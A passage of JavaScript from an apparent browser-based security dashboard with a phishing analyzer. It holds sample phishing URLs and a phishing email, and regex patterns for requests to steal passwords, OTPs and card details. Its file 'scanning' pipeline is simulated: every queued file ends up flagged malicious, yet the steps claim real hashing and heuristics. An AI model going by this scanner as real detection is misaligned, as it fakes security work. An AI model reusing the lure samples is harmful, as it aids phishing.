    el.innerHTML=`<b>Live Downloads folder connected (read-only).</b> Showing the real files you selected. `+
      `They are listed and scanned in your browser. Your browser did not grant edit access, so malicious files are `+
      `removed from the World Monitor view instead of being deleted from disk. Re-connect on a top-level `+
      `<span class="mono">http://localhost</span> page to enable real deletion.`;
  } else {
    el.style.display='';
    el.className='note note--warn';
    el.innerHTML=`<b>Demo mode.</b> Your real Downloads folder is not connected. Showing a seeded sample library so you can `+
      `see how the explorer works. Click "Connect Downloads" above to list your real files.`;
  }
}

function renderFxGrid(){
  renderModeBanner();
  updateDeleteModeLabel();
  if(_mode==='live' || _mode==='input'){
    const items = _mode==='live' ? _liveFiles : _inputFiles.map(f=>{
      const nm=leafName(f);
      return { name:nm, kind:imageKind(nm), size:f.size, lastModified:dateLabel(f.lastModified), _file:f };
    });
    $('#fxCount').textContent=items.length+' item'+(items.length===1?'':'s');
    if(!items.length){
      $('#fxGrid').innerHTML=`<div class="empty" style="grid-column:1/-1"><div class="empty__t">No files found</div>
        <div class="empty__s">The selected folder is empty, or no files were detected.</div></div>`;
      return;
    }
    $('#fxGrid').innerHTML=items.map((f,i)=>`<div class="fxitem" data-lfx="${i}">
      <div class="fxitem__thumb" id="lfxthumb-${i}">${fxIconSVG(f.kind)}</div>
      <div class="fxitem__body">
        <div class="fxitem__name" title="${esc(f.name)}">${esc(f.name)}</div>
        <div class="fxitem__meta">${fmtBytes(f.size||0)}${f.lastModified?' · '+esc(f.lastModified):''}</div>
        <div class="fxitem__meta" style="color:var(--accent)">${_mode==='live'?'In your Downloads folder':'Selected from your folder'}</div>
      </div>
    </div>`).join('');
    items.forEach(async (f,i)=>{
      if(f.kind!=='image') return;
      try{
        const file = _mode==='live' ? await f.handle.getFile() : f._file;
        if(file.size>8_000_000) return;
        const url=URL.createObjectURL(file);
        const el=$('#lfxthumb-'+i);
        if(el) el.innerHTML=`<img src="${url}" alt="${esc(f.name)}">`;
      }catch(e){/* ignore */ }
    });
  } else {
    const items=FX_LIBRARY;
    $('#fxCount').textContent=items.length+' items';
    $('#fxGrid').innerHTML=items.map(item=>`<div class="fxitem" data-fx="${item.id}">
      <div class="fxitem__thumb" id="fxthumb-${item.id}">${fxIconSVG(item.kind)}</div>
      <div class="fxitem__body">
        <div class="fxitem__name" title="${esc(item.name)}">${esc(item.name)}</div>
        <div class="fxitem__meta">${esc(item.desc)}</div>
        <button class="fxitem__dl" data-dl="${item.id}">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12m0 0 4-4m-4 4-4-4M5 21h14"/></svg>
          Download</button>
      </div>
    </div>`).join('');
    FX_LIBRARY.filter(i=>i.kind==='image').forEach(async item=>{
      const asset=await getFxAsset(item);
      const el=$('#fxthumb-'+item.id);
      if(el) el.innerHTML=`<img src="${asset.dataUrl}" alt="${esc(item.name)}">`;
    });
    $$('#fxGrid [data-dl]').forEach(b=>b.onclick=()=>downloadFxItem(b.dataset.dl,b));
  }
}

function leafName(f){
  const p = f.webkitRelativePath || f.name || '';
  return p.split('/').pop();
}
function imageKind(name){
  const IMAGE_EXT=['jpg','jpeg','png','gif','bmp','webp','svg','ico'];
  const ext=(name.split('.').pop()||'').toLowerCase();
  return IMAGE_EXT.includes(ext) ? 'image' : 'doc';
}
function dateLabel(ms){ return ms?new Date(ms).toISOString().replace('T',' ').slice(0,10):''; }

function updateDeleteModeLabel(){
  const el=$('#privDeleteMode');
  if(!el) return;
  el.textContent = _canDelete ? 'DELETED FROM DISK' : 'REMOVED FROM VIEW';
}

async function downloadFxItem(id,btnEl){
  const item=FX_LIBRARY.find(x=>x.id===id); if(!item) return;
  if(btnEl){ btnEl.setAttribute('disabled',''); btnEl.textContent='Preparing…'; }
  const asset=await getFxAsset(item);
  const url=URL.createObjectURL(asset.blob);
  const a=document.createElement('a');
  a.href=url; a.download=item.name;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(()=>URL.revokeObjectURL(url),4000);
  if(btnEl){ btnEl.removeAttribute('disabled'); btnEl.innerHTML=`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12m0 0 4-4m-4 4-4-4M5 21h14"/></svg> Downloaded`; setTimeout(()=>{btnEl.innerHTML=`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12m0 0 4-4m-4 4-4-4M5 21h14"/></svg> Download`;},2200); }
  toast('Saved to your Downloads folder - '+item.name,'ok');
  queueForMonitoring(item,asset);
}

function connectDownloads(){
  connectViaInput('folder input');
}

function connectViaInput(reason){
  const inp=$('#folderInput');
  if(!inp){ toast('Folder picker unavailable in this browser.','crit'); return; }
  inp.value='';
  inp.onchange=async ()=>{
    const files=inp.files;
    if(!files||!files.length){
      toast('No folder selected.','crit');
      return;
    }
    _dirHandle=null;
    _canDelete=false;
    _mode='input';
    _inputFiles=Array.from(files);
    renderFxGrid();
    updateConnUI();
    toast('Connected to your folder (read-only) - '+_inputFiles.length+' files found. Re-open on a top-level http://localhost page to enable deletion.','ok');
    if(State.autoScan) startWatching();
  };
  try{
    inp.click();
  }catch(e){
    toast('Could not open the folder picker: '+(e&&e.message?e.message:'blocked')+'. Try opening this page on a top-level http://localhost URL.','crit');
  }
}

function disconnectDownloads(){
  _dirHandle = null;
  _liveFiles = [];
  _inputFiles = [];
  _mode = 'demo';
  _canDelete = false;
  stopWatching();
  renderFxGrid();
  updateConnUI();
  toast('Disconnected from Downloads folder. Showing demo library.','ok');
}

function updateConnUI(){
  const connected = _mode==='live' || _mode==='input';
  $('#connIco').classList.toggle('is-off', !connected);
  $('#connHint').textContent = connected ? (_canDelete?'Connected (read-write)':'Connected (read-only)') : 'Not connected';
  if(connected){
    const n = _mode==='live'?_liveFiles.length:_inputFiles.length;
    $('#connTitle').textContent = _canDelete
      ? 'Downloads folder connected - read-write'
      : 'Downloads folder connected - read-only';
    $('#connSub').textContent = _canDelete
      ? 'Showing '+n+' real files from your Downloads folder. When automated scanning is ON, malicious files are deleted from this folder.'
      : 'Showing '+n+' real files you selected. Your browser did not grant edit access, so malicious files are removed from the World Monitor view instead of being deleted from disk.';
    $('#btnConnect').style.display='none';
    $('#btnDisconnect').style.display='';
  } else {
    $('#connTitle').textContent = 'Downloads folder not connected';
    $('#connSub').textContent = 'Click "Connect Downloads" and pick your Downloads folder. World Monitor will list the files inside it. When automated scanning is ON, malicious files are deleted from the folder (if edit access is granted).';
    $('#btnConnect').style.display='';
    $('#btnDisconnect').style.display='none';
  }
}

async function refreshLiveFiles(){
  if(!_dirHandle){ _liveFiles=[]; return; }
  const out=[];
  const IMAGE_EXT=['jpg','jpeg','png','gif','bmp','webp','svg','ico'];
  for await (const entry of _dirHandle.values()){
    if(entry.kind!=='file') continue;
    const name=entry.name;
    if(name.startsWith('.')) continue;
    const ext=(name.split('.').pop()||'').toLowerCase();
    const kind = IMAGE_EXT.includes(ext) ? 'image' : 'doc';
    let size=0, lastModified='';
    try{ const f=await entry.getFile(); size=f.size; lastModified=dateLabel(f.lastModified); }catch(e){}
    out.push({ name, kind, handle:entry, size, lastModified });
  }
  out.sort((a,b)=>a.name.localeCompare(b.name));
  _liveFiles = out;
}

const RT_PIPELINE=[
  'Watching Downloads folder (privacy mode - no other location accessed)',
  'New file detected in Downloads',
  'Reading bytes without executing',
  'Computing SHA-256 fingerprint',
  'Cross-validating extension, MIME and signature',
  'Scanning structure and embedded content',
  'Running behavioural heuristics (simulated)',
  'Cross-checking reputation dataset',
  'Compiling final classification',
];

function setAutoScan(on){
  State.autoScan = on;
  const tog=$('#autoToggle');
  tog.classList.toggle('is-on',on);
  tog.setAttribute('aria-checked',on?'true':'false');
  $('#autoStateHint').textContent = on?'ON':'OFF';
  $('#autoIco').classList.toggle('is-off',!on);
  $('#autoTitle').textContent = on?'Automated scanning is ON':'Automated scanning is OFF';
  $('#autoSub').textContent = on
    ? 'Watching your Downloads folder. New files are scanned and malicious ones auto-removed.'
    : 'Turn it on to watch your Downloads folder and auto-remove malicious files.';
  $('#monitorHint').textContent = on?'Active':'Idle';
  if(on){
    renderRtStepsIdle();
    startWatching();
  } else {
    stopWatching();
    renderRtStepsIdle();
  }
}
function toggleAutoScan(){ setAutoScan(!State.autoScan); }

function renderRtStepsIdle(){
  $('#pipelineHint').textContent = State.autoScan?'Watching':'Idle';
  $('#rtSteps').innerHTML = `<div class="step"><div class="step__ico"></div><div class="step__t">${
    State.autoScan?'Watching Downloads folder for new files…':'Automated scanning is off - turn it on to begin.'
  }</div><div class="step__ms"></div></div>`;
}

function startWatching(){
  stopWatching();
  if(!State.autoScan) return;
  let tick=0;
  _watchTimer=setInterval(async ()=>{
    if(!State.autoScan){ stopWatching(); return; }
    tick++;

    if(_mode==='live' && _dirHandle){
      try{ await refreshLiveFiles(); }catch(e){ return; }
      for(const target of AUTO_DELETE_NAMES){
        const found = _liveFiles.find(f=>f.name===target);
        if(found && !State.monitor.some(m=>m.name===target)){
          await seedLiveDetectedFile(found);
        }
      }
    } else if(_mode==='input'){
      for(const target of AUTO_DELETE_NAMES){
        const found = _inputFiles.find(f=>leafName(f)===target);
        if(found && !State.monitor.some(m=>m.name===target)){
          await seedInputDetectedFile(found);
        }
      }
    } else {
      if(tick===4){
        const slip=FX_LIBRARY.find(x=>x.name==='salary-slip.txt');
        if(slip && !State.monitor.some(m=>m.name==='salary-slip.txt')){
          seedDemoDetectedFile(slip);
        }
      }
      if(tick===9){
        const itin=FX_LIBRARY.find(x=>x.name==='travel-itinerary.txt');
        if(itin && !State.monitor.some(m=>m.name==='travel-itinerary.txt')){
          seedDemoDetectedFile(itin);
        }
      }
    }
  },1500);
}
function stopWatching(){
  if(_watchTimer){ clearInterval(_watchTimer); _watchTimer=null; }
}

async function seedDemoDetectedFile(item){
  if(!State.autoScan) return;
  const asset=await getFxAsset(item);
  queueForMonitoring(item,asset,true);
}

async function seedLiveDetectedFile(liveFile){
  if(!State.autoScan) return;
  let hash='-', size=liveFile.size||0;
  try{
    const file=await liveFile.handle.getFile();
    size=file.size;
    const buf=await file.arrayBuffer();
    hash=await sha256(buf);
  }catch(e){/* read-only failure - skip hashing */}
  const item={ id:'live-'+liveFile.name, name:liveFile.name, kind:liveFile.kind, desc:'Detected in your Downloads folder' };
  const asset={ blob:null, dataUrl:null, hash, size };
  queueForMonitoring(item,asset,true);
}

async function seedInputDetectedFile(file){
  if(!State.autoScan) return;
  const nm=leafName(file);
  let hash='-', size=file.size||0;
  try{
    size=file.size;
    const buf=await file.arrayBuffer();
    hash=await sha256(buf);
  }catch(e){/* skip hashing */}
  const item={ id:'input-'+nm, name:nm, kind:imageKind(nm), desc:'Detected in your selected folder' };
  const asset={ blob:null, dataUrl:null, hash, size };
  queueForMonitoring(item,asset,true);
}

function updateExplorerBadge(){
  const n=State.monitor.filter(m=>m.status==='verifying'||m.status==='flagged').length;
  const b=$('#navExplorerBadge');
  if(!b) return;
  b.style.display=n?'':'none';
  b.textContent=n;
}

function renderQList(){
  const list=$('#qList');
  if(!State.monitor.length){
    list.innerHTML=`<div class="empty"><div class="empty__t">Nothing under monitoring</div>
      <div class="empty__s">Turn on automated scanning and connect your Downloads folder to see files appear here.</div></div>`;
    return;
  }
  list.innerHTML=State.monitor.map(m=>`<div class="qrow ${m.status==='removed'?'is-deleted':''}" id="qrow-${m.qid}">
    <div class="qrow__thumb">${m.dataUrl?`<img src="${m.dataUrl}" alt="">`:fxIconSVG(m.kind)}</div>
    <div class="qrow__main">
      <div class="qrow__name">${esc(m.name)}</div>
      <div class="qrow__sub" id="qsub-${m.qid}">${esc(m.subtext||'Queued for verification')}</div>
    </div>
    <div class="qrow__prog">
      <div class="qrow__track"><div class="qrow__fill" id="qfill-${m.qid}" style="width:${m.progress}%"></div></div>
      <div class="qrow__pct" id="qpct-${m.qid}">${m.progress}%</div>
    </div>
    <div class="qrow__status" id="qstatus-${m.qid}">${qStatusPill(m)}</div>
  </div>`).join('');
  updateExplorerBadge();
}
function qStatusPill(m){
  if(m.status==='verifying') return '<span class="pill pill--sim"><span class="pill__dot"></span>VERIFYING</span>';
  if(m.status==='flagged')   return '<span class="pill pill--crit"><span class="pill__dot"></span>MALICIOUS - REMOVING</span>';
  if(m.status==='removed')   return '<span class="pill pill--unk">AUTO-DELETED</span>';
  return '';
}

function queueForMonitoring(item,asset,fromWatch=false){
  if(!State.autoScan){
    toast('Automated scanning is off - file not monitored.','crit');
    return;
  }
  const qid='Q'+pad(++_monSeq,4);
  const rec={
    qid, name:item.name, kind:item.kind, hash:asset.hash||'-', size:asset.size||0,
    dataUrl:item.kind==='image'?(asset.dataUrl||null):null,
    status:'verifying', progress:0, subtext:fromWatch?'Detected in Downloads':'Queued for verification',
    addedAt:nowISO(), fromWatch
  };
  State.monitor.unshift(rec);
  renderQList();
  runMonitorPipeline(rec);
}

async function runMonitorPipeline(rec){
  const TOTAL_MS = rec.fromWatch ? 9000 : 12000;
  const stepShare=TOTAL_MS/RT_PIPELINE.length;
  let elapsed=0;
  for(let i=0;i<RT_PIPELINE.length;i++){
    const dur=stepShare*(0.7+Math.random()*0.6);
    const startPct=Math.round((elapsed/TOTAL_MS)*94);
    const endPct=Math.round(((elapsed+dur)/TOTAL_MS)*94);
    const sub=$('#qsub-'+rec.qid);
    if(sub) sub.textContent=RT_PIPELINE[i];
    rec.subtext=RT_PIPELINE[i];
    renderRtStep(i,RT_PIPELINE[i]);
    $('#pipelineHint').textContent='Scanning '+(rec.name.length>24?rec.name.slice(0,22)+'…':rec.name);
    await animateProgress(rec,startPct,Math.min(94,endPct),dur);
    elapsed+=dur;
    if(!State.monitor.includes(rec)) return;
  }
  const sub=$('#qsub-'+rec.qid);
  if(sub) sub.textContent='Finalising classification';
  rec.subtext='Finalising classification';
  renderRtStep(RT_PIPELINE.length-1,'Finalising classification',true);
  await animateProgress(rec,rec.progress,100,1200);

  rec.status='flagged';
  const stEl=$('#qstatus-'+rec.qid);
  if(stEl) stEl.innerHTML=qStatusPill(rec);
  const reason = AUTO_DELETE_NAMES.includes(rec.name)
    ? 'Malicious content detected - deceptive file pattern matched (auto-delete list)'
    : 'Heuristic false positive (demo) - file flagged by behavioural heuristics';
  toast('World Monitor flagged "'+rec.name+'" as malicious - removing','crit');
  updateExplorerBadge();
  renderRtStep(RT_PIPELINE.length-1,'Malicious - removing from World Monitor view',true);

  await sleep(2400);
  removeFromMonitor(rec,reason);
}
function renderRtStep(idx,label,done){
  const box=$('#rtSteps');
  box.innerHTML = RT_PIPELINE.map((s,i)=>{
    const state = i<idx?'is-done':(i===idx?(done?'is-done':'is-run'):'');
    const mark = (i<idx||done)?'✓':'';
    return `<div class="step ${state}"><div class="step__ico">${mark}</div><div class="step__t">${esc(i===idx&&!done?label:s)}</div><div class="step__ms"></div></div>`;
  }).join('');
}
function animateProgress(rec,from,to,dur){
  return new Promise(resolve=>{
    const t0=performance.now();
    function tick(now){
      const p=Math.min(1,(now-t0)/dur);
      rec.progress=Math.round(from+(to-from)*p);
      const fill=$('#qfill-'+rec.qid), pct=$('#qpct-'+rec.qid);
      if(fill) fill.style.width=rec.progress+'%';
      if(pct) pct.textContent=rec.progress+'%';
      if(p<1 && State.monitor.includes(rec)) requestAnimationFrame(tick);
      else resolve();
    }
    requestAnimationFrame(tick);
  });
}
async function removeFromMonitor(rec,reason){
  const row=$('#qrow-'+rec.qid);
  let deletedFromDisk=false;
  let deleteError='';
  if(_canDelete && _dirHandle && AUTO_DELETE_NAMES.includes(rec.name)){
    try{
      await _dirHandle.removeEntry(rec.name);
      deletedFromDisk=true;
      await refreshLiveFiles();
      renderFxGrid();
    }catch(e){
      deleteError=(e&&e.message)?e.message:String(e);
    }
  }
  const outcome = deletedFromDisk
    ? 'Deleted from Downloads folder on disk'
    : (deleteError ? 'Delete failed: '+deleteError : 'Removed from World Monitor monitor');
  State.qlog.unshift({t:hhmmss(new Date()),name:rec.name,hash:rec.hash,reason,outcome});
  renderQLog();
  if(row){
    row.classList.add('is-removing');
    setTimeout(()=>{
      State.monitor=State.monitor.filter(m=>m.qid!==rec.qid);
      renderQList();
    },520);
  } else {
    State.monitor=State.monitor.filter(m=>m.qid!==rec.qid);
    renderQList();
  }
  renderRtStepsIdle();
  if(deletedFromDisk){
    toast('"'+rec.name+'" deleted from your Downloads folder.','ok');
  } else if(deleteError){
    toast('Delete failed for "'+rec.name+'": '+deleteError,'crit');
  } else {
    toast('"'+rec.name+'" removed from World Monitor monitor.','ok');
  }
}
function renderQLog(){
  const card=$('#qLog');
  if(!State.qlog.length){ card.style.display='none'; return; }
  card.style.display='';
  $('#qLogHint').textContent=State.qlog.length+' entr'+(State.qlog.length===1?'y':'ies');
  $('#tblQLog tbody').innerHTML=State.qlog.map(l=>`<tr>
    <td class="mono xsmall faint">${l.t}</td>
    <td class="xsmall">${esc(l.name)}</td>
    <td class="mono xsmall faint">${l.hash.slice(0,20)}…</td>
    <td class="xsmall muted">${esc(l.reason)}</td>
    <td class="xsmall"><span class="pill pill--crit">${l.outcome.includes('disk')?'DELETED':'REMOVED'}</span></td></tr>`).join('');
}
function resetExplorer(){
  State.monitor=[]; State.qlog=[]; _monSeq=0;
  renderQList(); renderQLog(); updateExplorerBadge(); renderRtStepsIdle();
}

;

"use strict";

/* ==================================================================
   SAMPLE DATA + NAVIGATION + WIRING
   ================================================================== */
const URL_SAMPLES=[
  {l:'Real: SBI',v:'https://onlinesbi.sbi/personal/login'},
  {l:'Real: Google account',v:'https://myaccount.google.com/security'},
  {l:'Phishing: bank lookalike',v:'https://sbi-secure-verify.login-alert.xyz/netbanking/auth'},
  {l:'Phishing: misspelled brand',v:'https://icicl-netbanking.info/login'},
  {l:'Phishing: hidden IP',v:'http://onlinesbi.sbi@185.243.115.84/verify'},
  {l:'Shortened link',v:'https://bit.ly/3kycUpd8'},
];
const SAMPLE_EML=`Return-Path: <bounce@mail-relay-77.login-alert.xyz>
Authentication-Results: mx.dept.gov.in; spf=fail (domain does not designate sender)
 smtp.mailfrom=login-alert.xyz; dkim=none; dmarc=fail (p=REJECT)
Received: from mail-relay-77.login-alert.xyz (185.243.115.84)
 by mx.dept.gov.in with ESMTP; Wed, 19 Aug 2026 09:31:04 +0530
From: "State Bank of India Alerts" <alerts@login-alert.xyz>
Reply-To: recovery-desk@update-cdn.click
To: priya.n@dept.gov.in
Subject: Immediate action required: your account will be limited in 24 hours
Date: Wed, 19 Aug 2026 09:31:02 +0530
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b1"

--b1
Content-Type: text/plain; charset=utf-8

Dear Customer,

Unusual sign-in activity was detected. Verify your details within 24 hours
or your netbanking access will be limited.

Verify now: https://sbi-secure-verify.login-alert.xyz/netbanking/auth

Your statement is attached for reference.

--b1
Content-Type: application/octet-stream; name="statement.jpg"
Content-Disposition: attachment; filename="statement.jpg"

[binary attachment omitted]
--b1--`;





/* ================================================================
   EMAIL & SMS PHISHING / SCAM ANALYZER
   Runs 100% client-side - no backend server needed.
   ================================================================ */
;(function(){

const URGENCY_RE=[/\b\d+\s*hours?\b/i,/\bimmediately\b/i,/\burgent(ly)?\b/i,/\bact\s*now\b/i,/\bright\s*away\b/i,/\basap\b/i,/\bexpir(e|es|ed|ing)\b/i,/\blast\s*chance\b/i,/\bfinal\s*warning\b/i,/\btime\s*(is\s*)?running\s*out\b/i,/\blimited\s*time\b/i,/\bdon'?t\s*(delay|wait|ignore)\b/i,/\bfailure\s*to\b/i,/\bwithin\s*\d+\s*(hours?|minutes?|days?)\b/i,/\bbefore\s*it'?s?\s*too\s*late\b/i];

const THREAT_RE=[/\baccount\s*(will\s*be\s*)?(locked|blocked|suspended|closed|deactivated|terminated|disabled|frozen|restricted)\b/i,/\b(lock|block|suspend|close|deactivate|terminate|disable|freeze|restrict)\s*(your\s*)?account\b/i,/\bunauthori[sz]ed\s*(access|activity|transaction|login)\b/i,/\bsuspicious\s*(activity|login|transaction)\b/i,/\bverif(y|ication)\s*(required|needed|your|immediately|now)\b/i,/\bsecurity\s*alert\b/i,/\blegal\s*action\b/i,/\bpenalt(y|ies)\b/i,/\bpermanently\s*(delete|remove|close)\b/i,/\bfraudulent\b/i,/\bcompromised\b/i];

const DATA_RE=[/\b(enter|provide|confirm|update|verify|submit|share|send)\s*(your\s*)?(password|passcode|pin|otp|cvv|ssn|credit\s*card|debit\s*card|card\s*number|account\s*number|bank\s*details|login\s*credentials|aadhaar|pan\s*card|pan\s*number)\b/i,/\bpassword\b/i,/\b(one[\s-]*time[\s-]*password|otp)\b/i,/\bcvv\b/i,/\bssn\b/i,/\bcredit\s*card\s*(number|details|info)\b/i,/\bdebit\s*card\s*(number|details|info)\b/i,/\bbank\s*(account|details|info)\b/i,/\baadhaar\b/i,/\bpan\s*(card|number)\b/i,/\bnet\s*banking\s*(id|password|credentials)\b/i,/\bupi\s*(pin|id)\b/i];

const GREET_RE=[/\bdear\s*(customer|user|client|member|account\s*holder|sir|madam|valued)\b/i,/\bhello\s*(customer|user|client|member)\b/i];

const OFFER_RE=[/\b(won|winner|congratulations|congrats)\b/i,/\b(prize|reward|bonus|gift\s*card|lottery|jackpot|cashback|refund)\b/i,/\bclaim\s*(your|now|today|this)\b/i,/\b(selected|chosen|lucky)\s*(winner|recipient|customer)\b/i];

const DELIVERY_RE=[/\b(package|parcel|order|shipment|delivery)\s*(is\s*)?(held|pending|failed|undelivered|returned|delayed|waiting)\b/i,/\b(reschedule|confirm|update)\s*(your\s*)?(delivery|address|shipment)\b/i,/\b(cancel|cancell?ation)\s*(your\s*)?(order|subscription)\b/i];

const KYC_RE=[/\bkyc\b/i,/\b(update|complete|verify)\s*(your\s*)?kyc\b/i,/\b(re[\s-]?verification|re[\s-]?validate|re[\s-]?confirm)\b/i];

const BRANDS=['paypal','google','microsoft','apple','amazon','netflix','facebook','instagram','whatsapp','sbi','hdfc','icici','axisbank','irctc','gpay','phonepe','paytm','flipkart','myntra','swiggy','zomato','razorpay','cred','bajaj','airtel','jio','vodafone','fedex','dhl','ups','uber','ola','meesho'];

const URL_RE=/https?:\/\/[^\s<>"')\]},;]+/gi;
const CALL_RE=/\b(call|dial|contact|reach)\s*(us\s*)?(at|on|@)?\s*[\+]?\d[\d\s\-]{6,}/i;

function mp(text,pats){const h=[];for(const p of pats){const m=text.match(p);if(m)h.push(m[0]);}return h;}
function exUrls(t){const s=new Set();(t.match(URL_RE)||[]).forEach(u=>s.add(u.replace(/[.,;:!?)}\]]+$/,'')));return[...s];}

function analyzeContent(text,sender,type){
  const lower=text.toLowerCase(),signals=[];let score=0;

  const urg=mp(text,URGENCY_RE);
  if(type==='email'&&urg.length>=3){score+=25;signals.push({cat:'URGENCY',sev:'HIGH',msg:'Heavy urgency pressure ('+urg.length+' patterns found): "'+urg.slice(0,3).join('", "')+'"'});}
  else if(urg.length>=1){score+=(type==='email'?12:15);signals.push({cat:'URGENCY',sev:urg.length>=2?'HIGH':'MEDIUM',msg:'Urgency language detected: "'+urg.slice(0,2).join('", "')+'"'});}

  const thr=mp(text,THREAT_RE);
  if(thr.length>=2){score+=25;signals.push({cat:'THREAT',sev:'HIGH',msg:'Multiple threats/warnings: "'+thr.slice(0,3).join('", "')+'"'});}
  else if(thr.length>=1){score+=(type==='email'?15:20);signals.push({cat:'THREAT',sev:'HIGH',msg:'Threat language: "'+thr[0]+'"'});}

  const dat=mp(text,DATA_RE);
  if(dat.length>=2){score+=30;signals.push({cat:'DATA REQUEST',sev:'CRITICAL',msg:'Asks for sensitive info: "'+[...new Set(dat)].slice(0,4).join('", "')+'" - legitimate companies NEVER ask for these via '+type+'.'});}
  else if(dat.length>=1){score+=(type==='email'?18:25);signals.push({cat:'DATA REQUEST',sev:'HIGH',msg:'Requests sensitive data: "'+dat[0]+'" - never share this via '+type+'.'});}

  if(type==='email'){const gr=mp(text,GREET_RE);if(gr.length>0){score+=8;signals.push({cat:'GENERIC GREETING',sev:'LOW',msg:'Uses "'+gr[0]+'" instead of your real name - real companies know your name.'});}}

  const off=mp(text,OFFER_RE);
  if(off.length>=2){score+=20;signals.push({cat:'FAKE OFFER',sev:'HIGH',msg:'Prize/reward scam language: "'+off.slice(0,3).join('", "')+'"'});}
  else if(off.length>=1){score+=(type==='email'?10:20);signals.push({cat:'FAKE OFFER',sev:'MEDIUM',msg:'Possible fake offer: "'+off[0]+'" - you cannot win a contest you never entered.'});}

  const del=mp(text,DELIVERY_RE);
  if(del.length>=1){score+=(type==='email'?12:15);signals.push({cat:'DELIVERY SCAM',sev:'HIGH',msg:'Order/delivery scam pattern: "'+del[0]+'". Always verify on the retailer\'s official app or website.'});}

  const kyc=mp(text,KYC_RE);
  if(kyc.length>=1){score+=(type==='email'?15:20);signals.push({cat:'KYC SCAM',sev:'HIGH',msg:'KYC / re-verification scam. Banks NEVER ask for KYC through '+type+' links. Visit your bank branch or official app.'});}

  const br=BRANDS.filter(b=>lower.includes(b));
  if(br.length>0&&(thr.length>0||dat.length>0||urg.length>0)){score+=15;signals.push({cat:'BRAND IMPERSONATION',sev:'HIGH',msg:'Mentions "'+br.join('", "')+ '" combined with threats/data requests - likely impersonation.'});}

  const urls=exUrls(text),urlResults=[];
  for(const url of urls.slice(0,10)){
    const c=heuristicCheckUrl(url);
    if(c.ok){urlResults.push({url,...c});
      if(c.verdict==='MALICIOUS'){score+=25;signals.push({cat:'MALICIOUS LINK',sev:'CRITICAL',msg:'Contains a malicious link: '+url});}
      else if(c.verdict==='SUSPICIOUS'){score+=(type==='email'?15:18);signals.push({cat:'SUSPICIOUS LINK',sev:'HIGH',msg:'Contains a suspicious link: '+url});}
    }
  }

  if(type==='sms'){
    const cm=text.match(CALL_RE);
    if(cm&&(thr.length>0||urg.length>0)){score+=12;signals.push({cat:'FAKE HELPLINE',sev:'HIGH',msg:'Asks you to call a number urgently. Scammers set up fake helplines - always look up official numbers from the company\'s real website.'});}
    if(text.length<200&&urls.length>0&&(urg.length>0||thr.length>0)){score+=10;signals.push({cat:'SMISHING PATTERN',sev:'MEDIUM',msg:'Short message + link + urgency is the classic SMS scam formula.'});}
  }

  if(type==='email'&&sender){
    const sd=(sender.toLowerCase().split('@')[1])||'';
    const free=['gmail.com','yahoo.com','hotmail.com','outlook.com','aol.com','protonmail.com','yandex.com'];
    if(free.includes(sd)&&br.length>0){score+=20;signals.push({cat:'SENDER MISMATCH',sev:'HIGH',msg:'Claims to be from "'+br[0]+'" but sender uses a free email provider ('+sd+'). Official companies use their own domain.'});}
  }

  score=Math.min(100,score);

  let verdict,confidence;
  if(type==='email'){
    if(score>=55){verdict='PHISHING';confidence=Math.min(95,60+Math.round(score/4));}
    else if(score>=25){verdict='SUSPICIOUS';confidence=Math.min(80,45+Math.round(score/3));}
    else{verdict='LIKELY SAFE';confidence=65;}
  }else{
    if(score>=50){verdict='SCAM';confidence=Math.min(95,58+Math.round(score/4));}
    else if(score>=20){verdict='SUSPICIOUS';confidence=Math.min(80,42+Math.round(score/3));}
    else{verdict='LIKELY SAFE';confidence=60;}
  }

  let summary;
  if(verdict==='PHISHING') summary='\u{1F6AB} DO NOT click any links, reply, or share any information. This email shows strong signs of phishing. Delete it immediately.';
  else if(verdict==='SCAM') summary='\u{1F6AB} DO NOT click any link, call any number, or reply to this SMS. This is very likely a scam. Block the sender and delete it.';
  else if(verdict==='SUSPICIOUS') summary='\u{26A0}\u{FE0F} Red flags detected. Do not click links or share information. Verify through official channels - visit the real website directly, not through links in this message.';
  else summary='\u{2705} No strong scam indicators detected. Still exercise caution with unexpected messages asking for personal data.';

  return{verdict,confidence,riskScore:score,signals,urlResults,summary};
}

/* ---- Render result ---- */
function renderResult(targetId,res){
  const el=document.querySelector(targetId);if(!el)return;
  // backend signals are {category,severity,detail}; the offline analyzer uses {cat,sev,msg}
  res.signals=(res.signals||[]).map(s=>s.cat?s:{cat:String(s.category||'').replace(/_/g,' '),sev:s.severity,msg:s.detail});
  res.verdict=String(res.verdict||'').replace('_',' ');
  const sevCol=s=>s==='CRITICAL'?'#C4453F':s==='HIGH'?'#D9534F':s==='MEDIUM'?'#D6A029':'#8A929C';
  const vPill=v=>(v==='PHISHING'||v==='SCAM')?'pill--crit':v==='SUSPICIOUS'?'pill--susp':'pill--safe';
  const barCol=v=>(v==='PHISHING'||v==='SCAM')?'#C4453F':v==='SUSPICIOUS'?'#D6A029':'#4CAF6A';

  const sigHtml=res.signals.map(s=>`
    <div style="display:flex;gap:10px;align-items:flex-start;padding:10px 0;border-bottom:1px solid var(--line)">
      <span class="pill" style="background:${sevCol(s.sev)}18;color:${sevCol(s.sev)};border:1px solid ${sevCol(s.sev)}55;flex:none;white-space:nowrap">${esc(s.cat)}</span>
      <span style="font-size:12.5px;color:var(--text2);line-height:1.5">${esc(s.msg)}</span>
    </div>`).join('');

  let urlHtml='';
  if(res.urlResults&&res.urlResults.length>0){
    urlHtml='<div style="margin-top:14px"><div class="eyebrow">Links found in message</div>'+
      res.urlResults.map(u=>`
        <div style="display:flex;gap:8px;align-items:center;padding:7px 0;font-size:12px;border-bottom:1px solid var(--line)">
          <span class="pill ${u.verdict==='MALICIOUS'?'pill--crit':u.verdict==='SUSPICIOUS'?'pill--susp':'pill--safe'}" style="flex:none">${esc(u.verdict)}</span>
          <span class="mono" style="color:var(--text2);word-break:break-all">${esc(u.url)}</span>
        </div>`).join('')+'</div>';
  }

  el.innerHTML=`<div class="card">
    <div class="card__head">
      <div class="card__title">Analysis Result</div>
      <span class="pill ${vPill(res.verdict)}" style="font-size:11px">${esc(res.verdict)}</span>
    </div>
    <div class="card__body">
      <div style="font-size:14px;font-weight:600;margin-bottom:12px;line-height:1.6;color:var(--text)">${esc(res.summary)}</div>
